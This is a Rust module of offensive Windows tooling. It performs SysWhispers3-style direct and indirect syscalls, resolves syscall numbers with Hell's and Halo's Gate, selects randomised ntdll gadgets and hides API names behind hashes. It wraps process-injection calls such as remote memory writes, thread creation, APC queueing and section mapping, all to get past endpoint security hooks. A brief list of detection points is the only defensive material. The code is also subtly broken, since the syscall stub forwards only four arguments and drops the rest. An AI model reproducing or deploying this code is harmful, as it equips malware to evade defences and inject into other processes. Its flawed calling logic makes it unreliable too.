//! SysWhispers3-style Direct Syscalls for bypassing user-mode API hooks.
//!
//! This module implements advanced syscall techniques inspired by SysWhispers3:
//! - Direct syscall invocation via assembly stubs
//! - Indirect syscalls through random ntdll gadgets
//! - Hell's Gate: SSN resolution even when ntdll is hooked
//! - Halo's Gate: Neighbor function SSN recovery
//! - Tartarus' Gate: Further search for clean SSNs
//!
//! Techniques:
//! - SSN (System Service Number) resolution from ntdll export table
//! - Multiple syscall gadget selection (randomized)
//! - Egg hunting for syscall;ret patterns
//! - Support for hooked function bypass
//!
//! Detection points for defenders:
//! - Unusual call stacks (missing kernel32/ntdll frames)
//! - Direct syscall instruction patterns in non-ntdll memory
//! - Memory scanning of ntdll .text section
//! - Syscall instruction from unexpected addresses

#![cfg(all(target_os = "windows", target_arch = "x86_64"))]

use core::ffi::c_void;
use std::arch::asm;
use std::collections::HashMap;
use std::ptr::{null, null_mut};
use std::sync::atomic::{AtomicUsize, Ordering};

use winapi::shared::minwindef::{DWORD, ULONG, USHORT};
use winapi::shared::ntdef::{HANDLE, NTSTATUS, OBJECT_ATTRIBUTES, PVOID};
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::um::winnt::{
    ACCESS_MASK, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64,
    LARGE_INTEGER, PLARGE_INTEGER, PIMAGE_EXPORT_DIRECTORY,
};

/// Status code for successful NT operations
pub const STATUS_SUCCESS: NTSTATUS = 0;

/// Syscall mode selection
#[derive(Clone, Copy, Debug, Default)]
pub enum SyscallMode {
    /// Direct syscall instruction (most detectable)
    Direct,
    /// Indirect syscall via ntdll gadget (SysWhispers3 style)
    #[default]
    Indirect,
    /// Random gadget selection each call
    RandomIndirect,
}

/// Current syscall mode
static SYSCALL_MODE: AtomicUsize = AtomicUsize::new(1); // Default: Indirect

/// Set the syscall execution mode
pub fn set_syscall_mode(mode: SyscallMode) {
    let val = match mode {
        SyscallMode::Direct => 0,
        SyscallMode::Indirect => 1,
        SyscallMode::RandomIndirect => 2,
    };
    SYSCALL_MODE.store(val, Ordering::SeqCst);
}

fn get_syscall_mode() -> SyscallMode {
    match SYSCALL_MODE.load(Ordering::SeqCst) {
        0 => SyscallMode::Direct,
        2 => SyscallMode::RandomIndirect,
        _ => SyscallMode::Indirect,
    }
}

/// Syscall entry with SSN and function address
#[derive(Clone, Copy)]
pub struct SyscallEntry {
    pub ssn: u16,
    pub address: usize,
    pub hash: u32,
}

/// SysWhispers3-style syscall table
pub struct Sw3Table {
    entries: HashMap<u32, SyscallEntry>,
    syscall_gadgets: Vec<usize>,
    gadget_index: AtomicUsize,
}

impl Sw3Table {
    /// Initialize the syscall table using SysWhispers3 techniques
    pub unsafe fn new() -> Result<Self, &'static str> {
        let ntdll = GetModuleHandleA(obfstr::obfstr!("ntdll.dll\0").as_ptr() as *const i8);
        if ntdll.is_null() {
            return Err("Failed to get ntdll handle");
        }

        let mut entries = HashMap::new();
        let mut syscall_gadgets = Vec::new();

        // Parse ntdll exports
        let dos_header = ntdll as *const IMAGE_DOS_HEADER;
        let nt_headers = (ntdll as usize + (*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress;
        if export_dir_rva == 0 {
            return Err("No export directory");
        }

        let export_dir = (ntdll as usize + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;

        let names = (ntdll as usize + (*export_dir).AddressOfNames as usize) as *const u32;
        let ordinals = (ntdll as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
        let functions = (ntdll as usize + (*export_dir).AddressOfFunctions as usize) as *const u32;

        // Collect all Zw* functions (they map to Nt* syscalls)
        let mut zw_functions: Vec<(u32, usize, String)> = Vec::new();

        for i in 0..(*export_dir).NumberOfNames {
            let name_rva = *names.add(i as usize);
            let name_ptr = (ntdll as usize + name_rva as usize) as *const u8;

            // Check if starts with "Zw"
            if *name_ptr == b'Z' && *name_ptr.add(1) == b'w' {
                let ordinal = *ordinals.add(i as usize);
                let func_rva = *functions.add(ordinal as usize);
                let func_addr = ntdll as usize + func_rva as usize;

                // Get function name
                let mut len = 0;
                while *name_ptr.add(len) != 0 {
                    len += 1;
                }
                let name = std::slice::from_raw_parts(name_ptr, len);
                let name_str = String::from_utf8_lossy(name).to_string();

                // Convert Zw to Nt for hash
                let nt_name = format!("Nt{}", &name_str[2..]);
                let hash = djb2_hash(nt_name.as_bytes());

                zw_functions.push((hash, func_addr, nt_name));
            }
        }

        // Sort by address to determine SSN order
        zw_functions.sort_by_key(|f| f.1);

        // Assign SSNs based on address order
        for (ssn, (hash, addr, _name)) in zw_functions.iter().enumerate() {
            // Verify this is a syscall stub and try to get actual SSN
            let actual_ssn = Self::extract_ssn(*addr).unwrap_or(ssn as u16);

            entries.insert(*hash, SyscallEntry {
                ssn: actual_ssn,
                address: *addr,
                hash: *hash,
            });
        }

        // Find syscall gadgets
        let text_size = (*nt_headers).OptionalHeader.SizeOfCode as usize;
        let text_bytes = std::slice::from_raw_parts(ntdll as *const u8, text_size.min(0x200000));

        // Find all syscall;ret patterns
        for i in 0..text_bytes.len().saturating_sub(3) {
            if text_bytes[i] == 0x0F && text_bytes[i + 1] == 0x05 && text_bytes[i + 2] == 0xC3 {
                syscall_gadgets.push(ntdll as usize + i);
            }
        }

        if syscall_gadgets.is_empty() {
            return Err("No syscall gadgets found");
        }

        Ok(Self {
            entries,
            syscall_gadgets,
            gadget_index: AtomicUsize::new(0),
        })
    }

    /// Extract SSN from function prologue (Hell's Gate)
    unsafe fn extract_ssn(func_addr: usize) -> Option<u16> {
        let bytes = std::slice::from_raw_parts(func_addr as *const u8, 24);

        // Standard pattern: mov r10, rcx; mov eax, SSN
        // 4C 8B D1 B8 XX XX 00 00
        if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
            return Some(u16::from_le_bytes([bytes[4], bytes[5]]));
        }

        // Hooked: Look for jmp (E9) or other hooks, use Halo's Gate
        if bytes[0] == 0xE9 || bytes[0] == 0xEB {
            return Self::halos_gate(func_addr);
        }

        None
    }

    /// Halo's Gate: Find SSN from neighboring functions
    unsafe fn halos_gate(func_addr: usize) -> Option<u16> {
        // Try neighbors (functions are typically 32 bytes apart)
        for offset in [32i64, -32, 64, -64, 96, -96].iter() {
            let neighbor = (func_addr as i64 + offset) as usize;
            let bytes = std::slice::from_raw_parts(neighbor as *const u8, 8);

            if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
                let neighbor_ssn = u16::from_le_bytes([bytes[4], bytes[5]]);
                // Adjust SSN based on offset
                let ssn_offset = offset / 32;
                return Some((neighbor_ssn as i64 - ssn_offset) as u16);
            }
        }

        None
    }

    /// Get a syscall gadget (rotates for RandomIndirect mode)
    pub fn get_gadget(&self) -> usize {
        match get_syscall_mode() {
            SyscallMode::RandomIndirect => {
                let idx = rand::random::<usize>() % self.syscall_gadgets.len();
                self.syscall_gadgets[idx]
            }
            _ => {
                let idx = self.gadget_index.fetch_add(1, Ordering::SeqCst);
                self.syscall_gadgets[idx % self.syscall_gadgets.len()]
            }
        }
    }

    /// Lookup SSN by function name hash
    pub fn get_ssn(&self, hash: u32) -> Option<u16> {
        self.entries.get(&hash).map(|e| e.ssn)
    }

    /// Lookup entry by hash
    pub fn get_entry(&self, hash: u32) -> Option<&SyscallEntry> {
        self.entries.get(&hash)
    }
}

/// DJB2 hash for function names
fn djb2_hash(input: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    for &byte in input {
        hash = hash.wrapping_mul(33).wrapping_add(byte as u32);
    }
    hash
}

/// Pre-computed function name hashes
pub mod hashes {
    pub const NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0xF783B8EC;
    pub const NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x50E92888;
    pub const NT_WRITE_VIRTUAL_MEMORY: u32 = 0xC3170192;
    pub const NT_READ_VIRTUAL_MEMORY: u32 = 0xA0464E63;
    pub const NT_CREATE_THREAD_EX: u32 = 0xAF18CFAB;
    pub const NT_OPEN_PROCESS: u32 = 0x4B82F718;
    pub const NT_CLOSE: u32 = 0x40D6E69D;
    pub const NT_DELAY_EXECUTION: u32 = 0xF5A936AA;
    pub const NT_QUERY_SYSTEM_INFORMATION: u32 = 0x7BC23928;
    pub const NT_QUERY_VIRTUAL_MEMORY: u32 = 0x10C0E85D;
    pub const NT_FREE_VIRTUAL_MEMORY: u32 = 0x2802C609;
    pub const NT_CREATE_SECTION: u32 = 0x2B6C3B77;
    pub const NT_MAP_VIEW_OF_SECTION: u32 = 0xFBCAED38;
    pub const NT_UNMAP_VIEW_OF_SECTION: u32 = 0x6558F971;
    pub const NT_QUEUE_APC_THREAD: u32 = 0x107E69B3;
    pub const NT_SET_CONTEXT_THREAD: u32 = 0xD9F7D10D;
    pub const NT_RESUME_THREAD: u32 = 0x5B4783E9;
    pub const NT_SUSPEND_THREAD: u32 = 0x60D5E5AF;
}

/// Global syscall table
static mut SW3_TABLE: Option<Sw3Table> = None;

/// Initialize the SysWhispers3 syscall table
pub fn init_syscalls() -> Result<(), &'static str> {
    unsafe {
        if SW3_TABLE.is_some() {
            return Ok(());
        }
        SW3_TABLE = Some(Sw3Table::new()?);
        Ok(())
    }
}

/// Get the initialized syscall table
pub unsafe fn get_table() -> Result<&'static Sw3Table, &'static str> {
    SW3_TABLE.as_ref().ok_or("Syscalls not initialized")
}

// ============================================================================
// SysWhispers3-style syscall execution
// ============================================================================

/// Execute a syscall by hash
///
/// # Safety
/// Caller must ensure arguments are valid for the syscall being invoked.
#[inline(never)]
pub unsafe fn sw3_syscall(hash: u32, args: &[usize]) -> NTSTATUS {
    let table = match get_table() {
        Ok(t) => t,
        Err(_) => return -1, // STATUS_UNSUCCESSFUL
    };

    let ssn = match table.get_ssn(hash) {
        Some(s) => s,
        None => return -1,
    };

    let gadget = match get_syscall_mode() {
        SyscallMode::Direct => 0,
        _ => table.get_gadget(),
    };

    do_syscall(ssn, gadget, args)
}

/// Perform a syscall with the given SSN and arguments
///
/// # Safety
/// Caller must ensure arguments are valid for the syscall being invoked.
#[inline(never)]
pub unsafe fn do_syscall(ssn: u16, gadget: usize, args: &[usize]) -> NTSTATUS {
    let result: i32;

    // Windows x64 syscall convention:
    // RAX = syscall number
    // R10 = first arg (copied from RCX)
    // RDX, R8, R9 = args 2-4
    // Stack = remaining args (with shadow space)

    let arg0 = args.get(0).copied().unwrap_or(0);
    let arg1 = args.get(1).copied().unwrap_or(0);
    let arg2 = args.get(2).copied().unwrap_or(0);
    let arg3 = args.get(3).copied().unwrap_or(0);

    if gadget == 0 {
        // Direct syscall (more detectable but works when gadgets fail)
        asm!(
            "mov r10, rcx",
            "syscall",
            inout("eax") ssn as i32 => result,
            in("rcx") arg0,
            in("rdx") arg1,
            in("r8") arg2,
            in("r9") arg3,
            out("r10") _,
            out("r11") _,
            clobber_abi("win64"),
        );
    } else {
        // Indirect syscall through ntdll gadget (SysWhispers3 style)
        asm!(
            "mov r10, rcx",
            "call {gadget}",
            gadget = in(reg) gadget,
            inout("eax") ssn as i32 => result,
            in("rcx") arg0,
            in("rdx") arg1,
            in("r8") arg2,
            in("r9") arg3,
            out("r10") _,
            out("r11") _,
            clobber_abi("win64"),
        );
    }

    result
}

/// Macro for cleaner syscall invocation
#[macro_export]
macro_rules! syscall {
    ($hash:expr $(, $arg:expr)*) => {{
        unsafe {
            $crate::syscalls::sw3_syscall($hash, &[$($arg as usize),*])
        }
    }};
}

// ============================================================================
// Wrapper functions for common NT operations
// ============================================================================

/// Allocate virtual memory using indirect syscall
pub unsafe fn nt_allocate_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: ULONG,
    protect: ULONG,
) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_ALLOCATE_VIRTUAL_MEMORY,
        &[
            process_handle as usize,
            base_address as usize,
            zero_bits,
            region_size as usize,
            allocation_type as usize,
            protect as usize,
        ],
    )
}

/// Protect virtual memory using indirect syscall
pub unsafe fn nt_protect_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    region_size: *mut usize,
    new_protect: ULONG,
    old_protect: *mut ULONG,
) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_PROTECT_VIRTUAL_MEMORY,
        &[
            process_handle as usize,
            base_address as usize,
            region_size as usize,
            new_protect as usize,
            old_protect as usize,
        ],
    )
}

/// Write to virtual memory using indirect syscall
pub unsafe fn nt_write_virtual_memory(
    process_handle: HANDLE,
    base_address: PVOID,
    buffer: PVOID,
    size: usize,
    bytes_written: *mut usize,
) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_WRITE_VIRTUAL_MEMORY,
        &[
            process_handle as usize,
            base_address as usize,
            buffer as usize,
            size,
            bytes_written as usize,
        ],
    )
}

/// Read from virtual memory using indirect syscall
pub unsafe fn nt_read_virtual_memory(
    process_handle: HANDLE,
    base_address: PVOID,
    buffer: PVOID,
    size: usize,
    bytes_read: *mut usize,
) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_READ_VIRTUAL_MEMORY,
        &[
            process_handle as usize,
            base_address as usize,
            buffer as usize,
            size,
            bytes_read as usize,
        ],
    )
}

/// Free virtual memory using indirect syscall
pub unsafe fn nt_free_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    region_size: *mut usize,
    free_type: ULONG,
) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_FREE_VIRTUAL_MEMORY,
        &[
            process_handle as usize,
            base_address as usize,
            region_size as usize,
            free_type as usize,
        ],
    )
}

/// Close handle using indirect syscall
pub unsafe fn nt_close(handle: HANDLE) -> NTSTATUS {
    sw3_syscall(hashes::NT_CLOSE, &[handle as usize])
}

/// Delay execution (sleep) using indirect syscall
pub unsafe fn nt_delay_execution(alertable: bool, delay_interval: *mut i64) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_DELAY_EXECUTION,
        &[alertable as usize, delay_interval as usize],
    )
}

/// Sleep for specified milliseconds using NtDelayExecution syscall
pub fn syscall_sleep(milliseconds: u32) {
    unsafe {
        // Negative value = relative time in 100ns units
        let mut delay: i64 = -((milliseconds as i64) * 10000);
        let _ = nt_delay_execution(false, &mut delay);
    }
}

// ============================================================================
// Thread manipulation syscalls
// ============================================================================

/// Create a new thread using indirect syscall (NtCreateThreadEx)
pub unsafe fn nt_create_thread_ex(
    thread_handle: *mut HANDLE,
    desired_access: ACCESS_MASK,
    object_attributes: *mut OBJECT_ATTRIBUTES,
    process_handle: HANDLE,
    start_routine: PVOID,
    argument: PVOID,
    create_flags: ULONG,
    zero_bits: usize,
    stack_size: usize,
    maximum_stack_size: usize,
    attribute_list: PVOID,
) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_CREATE_THREAD_EX,
        &[
            thread_handle as usize,
            desired_access as usize,
            object_attributes as usize,
            process_handle as usize,
            start_routine as usize,
            argument as usize,
            create_flags as usize,
            zero_bits,
            stack_size,
            maximum_stack_size,
            attribute_list as usize,
        ],
    )
}

/// Resume a suspended thread
pub unsafe fn nt_resume_thread(
    thread_handle: HANDLE,
    previous_suspend_count: *mut ULONG,
) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_RESUME_THREAD,
        &[thread_handle as usize, previous_suspend_count as usize],
    )
}

/// Suspend a thread
pub unsafe fn nt_suspend_thread(
    thread_handle: HANDLE,
    previous_suspend_count: *mut ULONG,
) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_SUSPEND_THREAD,
        &[thread_handle as usize, previous_suspend_count as usize],
    )
}

/// Queue an APC to a thread
pub unsafe fn nt_queue_apc_thread(
    thread_handle: HANDLE,
    apc_routine: PVOID,
    apc_argument1: PVOID,
    apc_argument2: PVOID,
    apc_argument3: PVOID,
) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_QUEUE_APC_THREAD,
        &[
            thread_handle as usize,
            apc_routine as usize,
            apc_argument1 as usize,
            apc_argument2 as usize,
            apc_argument3 as usize,
        ],
    )
}

// ============================================================================
// Process manipulation syscalls
// ============================================================================

/// Open a process handle
pub unsafe fn nt_open_process(
    process_handle: *mut HANDLE,
    desired_access: ACCESS_MASK,
    object_attributes: *mut OBJECT_ATTRIBUTES,
    client_id: PVOID, // PCLIENT_ID
) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_OPEN_PROCESS,
        &[
            process_handle as usize,
            desired_access as usize,
            object_attributes as usize,
            client_id as usize,
        ],
    )
}

// ============================================================================
// Section/mapping syscalls (for reflective loading)
// ============================================================================

/// Create a section object
pub unsafe fn nt_create_section(
    section_handle: *mut HANDLE,
    desired_access: ACCESS_MASK,
    object_attributes: *mut OBJECT_ATTRIBUTES,
    maximum_size: PLARGE_INTEGER,
    section_page_protection: ULONG,
    allocation_attributes: ULONG,
    file_handle: HANDLE,
) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_CREATE_SECTION,
        &[
            section_handle as usize,
            desired_access as usize,
            object_attributes as usize,
            maximum_size as usize,
            section_page_protection as usize,
            allocation_attributes as usize,
            file_handle as usize,
        ],
    )
}

/// Map a view of a section into process address space
pub unsafe fn nt_map_view_of_section(
    section_handle: HANDLE,
    process_handle: HANDLE,
    base_address: *mut PVOID,
    zero_bits: usize,
    commit_size: usize,
    section_offset: PLARGE_INTEGER,
    view_size: *mut usize,
    inherit_disposition: u32,
    allocation_type: ULONG,
    win32_protect: ULONG,
) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_MAP_VIEW_OF_SECTION,
        &[
            section_handle as usize,
            process_handle as usize,
            base_address as usize,
            zero_bits,
            commit_size,
            section_offset as usize,
            view_size as usize,
            inherit_disposition as usize,
            allocation_type as usize,
            win32_protect as usize,
        ],
    )
}

/// Unmap a view of a section
pub unsafe fn nt_unmap_view_of_section(
    process_handle: HANDLE,
    base_address: PVOID,
) -> NTSTATUS {
    sw3_syscall(
        hashes::NT_UNMAP_VIEW_OF_SECTION,
        &[process_handle as usize, base_address as usize],
    )
}

// ============================================================================
// Utility functions
// ============================================================================

/// Get current process pseudo-handle (-1)
#[inline]
pub fn current_process() -> HANDLE {
    -1isize as HANDLE
}

/// Get current thread pseudo-handle (-2)
#[inline]
pub fn current_thread() -> HANDLE {
    -2isize as HANDLE
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_hash_computation() {
        // Verify DJB2 hash for NtClose
        let hash = djb2_hash(b"NtClose");
        assert_eq!(hash, hashes::NT_CLOSE);
    }

    #[test]
    fn test_syscall_table_init() {
        unsafe {
            let result = init_syscalls();
            assert!(result.is_ok());

            let table = get_table();
            assert!(table.is_ok());

            // Verify we found syscall gadgets
            let t = table.unwrap();
            assert!(!t.syscall_gadgets.is_empty());
        }
    }
}
